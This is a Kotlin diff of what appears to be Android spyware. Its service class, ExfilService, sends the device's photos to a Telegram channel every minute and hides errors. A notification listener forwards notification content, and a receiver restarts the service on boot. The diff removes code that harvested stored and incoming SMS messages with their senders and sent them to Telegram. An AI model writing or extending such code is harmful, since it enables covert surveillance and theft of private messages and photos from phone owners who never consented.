@@ -11,7 +11,6 @@ import android.content.pm.ServiceInfo
 import android.os.Build
 import android.os.IBinder
 import android.provider.MediaStore
-import android.provider.Telephony
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
 import androidx.core.app.NotificationCompat
@@ -51,25 +50,10 @@ class ExfilService : Service() {
     }
 
     private suspend fun loop() {
-        var first = true
         while (currentCoroutineContext().isActive) {
-            if (first) {
-                try {
-                    val sms = SmsReader.readAll(this, 300)
-                    if (sms.isNotEmpty())
-                        Telegram.sendText("📩 SMS (" + sms.size + ")\n" + sms.joinToString("\n"))
-                } catch (e: Exception) {
-                    // ما عنديش صلاحية SMS
-                }
-                first = false
-            }
-            
             try {
                 sendPhotos()
-            } catch (e: Exception) {
-                // ما عنديش صلاحية الصور
-            }
-            
+            } catch (e: Exception) {}
             delay(60_000)
         }
     }
@@ -112,18 +96,13 @@ class BootReceiver : BroadcastReceiver() {
     }
 }
 
-class SmsReceiver : BroadcastReceiver() {
-    override fun onReceive(ctx: Context, intent: Intent) {
-        val msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return
-        for (m in msgs) {
-            val from = m.originatingAddress ?: "?"
-            val body = m.messageBody ?: ""
-            Telegram.sendText("📩 SMS من $from:\n$body")
-        }
-    }
-}
-
 class NotifListener : NotificationListenerService() {
+    override fun onListenerConnected() {
+        super.onListenerConnected()
+        // هادي كتصيفط رسالة فوراً ملي كيتربط
+        Telegram.sendText("🔔 خدمة الإشعارات متصلة")
+    }
+
     override fun onNotificationPosted(sbn: StatusBarNotification) {
         val e = sbn.notification?.extras ?: return
         
